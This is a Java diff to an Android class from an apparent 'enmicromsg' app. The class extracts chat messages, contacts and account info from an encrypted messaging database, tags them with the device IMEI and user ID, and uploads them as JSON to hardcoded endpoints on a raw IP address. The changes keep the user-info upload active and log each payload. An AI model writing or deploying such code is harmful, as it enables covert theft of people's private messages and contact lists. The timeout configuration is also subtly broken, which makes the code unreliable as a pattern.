@@ -12,8 +12,10 @@ import net.sqlcipher.database.SQLiteDatabaseHook;
 
 import java.io.File;
 import java.io.IOException;
+import java.net.SocketTimeoutException;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.concurrent.TimeUnit;
 
 import cn.truistic.enmicromsg.common.service.WhiteService;
 import cn.truistic.enmicromsg.common.util.DeviceUtil;
@@ -50,6 +52,8 @@ public class HomePresenter implements MainMVP.IHomePresenter {
             "http://113.105.55.205:8090/UpData/ReceiveMessage.aspx";
     private static final String UserInfoUrlPath =
             "http://113.105.55.205:8090/UpData/ReceiveUserInfo.aspx";
+    // 超时时间
+    public static final int TIMEOUT = 1000 * 60;
 
 
     private String mContent,mCreateTime,mTalker,
@@ -216,22 +220,26 @@ public class HomePresenter implements MainMVP.IHomePresenter {
         mJsonMessage = JsonUtil.toJson(mMessageInfos);
         mJsonContent = JsonUtil.toJson(mContentInfos);
         mJsonUser = JsonUtil.toJson(mUserInfos);
-
         new Thread(new Runnable() {
             @Override
             public void run() {
-                postJson(MessageUrlPath,mJsonMessage);
-                postJson(ContentUrlPath,mJsonContent);
+               // postJson(ContentUrlPath,mJsonContent);
+                //postJson(MessageUrlPath,mJsonMessage);
                 postJson(UserInfoUrlPath,mJsonUser);
             }
         }).start();
 
+
+
         return true;
     }
 
-    private void postJson(String url,String s) {
+    private void postJson(String url, final String s) {
         MediaType JSON = MediaType.parse("application/json; charset=utf-8");
         OkHttpClient client = new OkHttpClient();//创建okhttp实例
+        client.newBuilder().connectTimeout(TIMEOUT, TimeUnit.SECONDS)
+                .writeTimeout(TIMEOUT,TimeUnit.SECONDS)
+                .readTimeout(TIMEOUT,TimeUnit.SECONDS);
         RequestBody body=RequestBody.create(JSON,s);
         Request request = new Request.Builder()
                 .url(url)
@@ -241,13 +249,16 @@ public class HomePresenter implements MainMVP.IHomePresenter {
         call.enqueue(new Callback() {
             @Override
             public void onFailure(okhttp3.Call call, IOException e) {
+
                 Log.i("DDDBBB----Presenter", "onFailure: " + e);
+
             }
 
             @Override
             public void onResponse(okhttp3.Call call, Response response) throws IOException {
                 if (response.isSuccessful()) {
-                    Log.i("DDDBBB----Presenter", "onResponse: " + response.body().string());
+                    Log.i("DDDBBB----Presenter", "onResponse-------: "+s+"------" + response.body()
+                            .string());
                 }
             }
 
@@ -436,7 +447,7 @@ public class HomePresenter implements MainMVP.IHomePresenter {
                     mIsSend="接收";
                 }
 
-                mMessageInfo = new MessageInfo(imei,msgId,mMsgSvrId,mType,mStatus,mIsSend,
+                mMessageInfo = new MessageInfo(uinStr,imei,msgId,mMsgSvrId,mType,mStatus,mIsSend,
                         mIsShowTimer,formatTime(mCreateTime),mTalker,mContent,mImgPath,mReserved,mLvbuffer,mTransContent,
                         mTransBrandWording,mTalkerId,mBizClientMsgId,mBizChaId,mBizChatUserId,
                         mMsgSeq,mFlag);
@@ -530,12 +541,13 @@ public class HomePresenter implements MainMVP.IHomePresenter {
                 mContactLabelIds = c1.getString(c1.getColumnIndex("contactLabelIds"));
                 mLvbuff = c1.getBlob(c1.getColumnIndex("lvbuff"));
 
-                mContentInfo = new ContentInfo(imei,mUserName,mAlias,mConRemark,mDomainList,
+                mContentInfo = new ContentInfo(uinStr,imei,mUserName,mAlias,mConRemark,mDomainList,
                         mNickName,mPyInitial,mQuanPin,mShowHead,mCttype,mWeiboFlag,mWeiboNickname,
                         mConRemarkPYFull,mConRemarkPYShort,mLvbuff,mVerifyFlag,mEncryptUsername,
                         mChatroomFlag,mDeleteFlag,mContactLabelIds);
 
                 mContentInfos.add(mContentInfo);
+//                postJson(ContentUrlPath,mJsonContent);
 
                 Log.i("DDDBBB---Presenter", mContentInfo.toString());
             }
@@ -601,7 +613,7 @@ public class HomePresenter implements MainMVP.IHomePresenter {
                 mVatype = c1.getString(c1.getColumnIndex("type"));
                 mValue = c1.getString(c1.getColumnIndex("value"));
 
-                mUserInfo = new UserInfo(imei,mVaid,mVatype,mValue);
+                mUserInfo = new UserInfo(uinStr,imei,mVaid,mVatype,mValue);
                 mUserInfos.add(mUserInfo);
 
 
